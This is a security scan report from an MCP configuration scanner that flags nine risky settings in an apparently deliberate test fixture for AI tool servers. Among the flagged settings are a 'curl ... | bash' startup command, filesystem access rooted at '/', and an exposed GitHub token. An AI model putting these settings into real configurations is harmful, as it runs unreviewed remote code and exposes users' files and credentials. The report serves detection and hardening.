# mcp-guard Scan Report

Generated: 2026-05-10T13:47:08.555Z

## Summary

- Scanned files: 1
- MCP servers: 3
- Active findings: 9
- Risk score: 98
- Critical: 2
- High: 5
- Medium: 2
- Low: 0

## Scanned Files

- `site/e2e/claude_desktop_config.json`

## MCP Server Inventory

| Server | Command | Args | CWD | URL | Env |
| --- | --- | --- | --- | --- | --- |
| filesystem-all-home | npx | @modelcontextprotocol/server-filesystem / | / | - | GITHUB_TOKEN=ghp...890 (32 chars) |
| shell-installer | bash | -c curl https://example.com/install.sh \| bash | - | - | - |
| remote-prod | - | - | - | https://mcp.example.com/sse | - |

## Active Findings

| Severity | Rule | Server | Finding | Evidence | Fingerprint | Recommendation |
| --- | --- | --- | --- | --- | --- | --- |
| critical | MCP010 | shell-installer | Shell command executes inline script | command=bash args=-c curl https://example.com/install.sh \| bash | mcpg_c2b742f0 | Use a direct, pinned executable instead of a shell wrapper. If a shell is required, place the script in source control and review it. |
| critical | MCP050 | shell-installer | MCP server command includes a dangerous operation | curl pipe to shell | mcpg_73e1a0da | Remove the dangerous operation from MCP startup. Run destructive setup steps manually and review them separately. |
| high | MCP021 | filesystem-all-home | Remote MCP package is not version pinned | package=@modelcontextprotocol/server-filesystem | mcpg_7390d900 | Pin the package to an exact version such as package@1.2.3 and review updates before changing it. |
| high | MCP030 | filesystem-all-home | Secret-like environment variable is exposed to MCP server | GITHUB_TOKEN=ghp...890 (32 chars) | mcpg_73964a76 | Pass the least privileged token possible. Prefer scoped tokens, short-lived credentials, and a dedicated service account. |
| high | MCP040 | filesystem-all-home | MCP server has a broad working directory | cwd=/ | mcpg_70425125 | Run the server in a narrow project directory or sandbox with only the files it needs. |
| high | MCP041 | filesystem-all-home | MCP server argument grants broad filesystem access | arg=/ | mcpg_eea814c0 | Replace broad filesystem paths with a dedicated project folder or read-only sandbox path. |
| high | MCP061 | remote-prod | Secret-like header is configured for remote MCP server | Authorization=Bea...ken (27 chars) | mcpg_ad4db81f | Use scoped, short-lived credentials and avoid placing long-lived secrets directly in MCP config files. |
| medium | MCP020 | filesystem-all-home | MCP server is launched through a remote package runner | command=npx package=@modelcontextprotocol/server-filesystem | mcpg_df881ae7 | Pin the package version, review the package source, and prefer a local lockfile or vendored executable for sensitive tools. |
| medium | MCP060 | remote-prod | Remote MCP server URL is configured | url=https://mcp.example.com/sse | mcpg_45117870 | Verify the provider, use HTTPS, document the data sent to this server, and keep an allowlist of approved remote endpoints. |

## Notes

- This report is an assistive security review, not a guarantee that all issues were found.
- Secret-like values are redacted by default.
- Review each MCP server before granting access to files, shells, SaaS accounts, or production systems.

